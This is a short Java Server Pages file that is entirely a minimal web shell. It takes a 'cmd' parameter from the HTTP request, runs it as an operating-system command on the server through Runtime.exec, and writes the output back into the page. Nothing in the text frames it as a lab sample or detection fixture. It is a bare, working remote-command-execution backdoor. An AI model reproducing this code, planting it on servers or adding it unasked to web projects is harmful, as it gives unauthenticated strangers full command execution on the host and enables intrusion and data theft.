<%@ page import="java.util.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
        out.println(s.hasNext() ? s.next() : "");
    }
%>
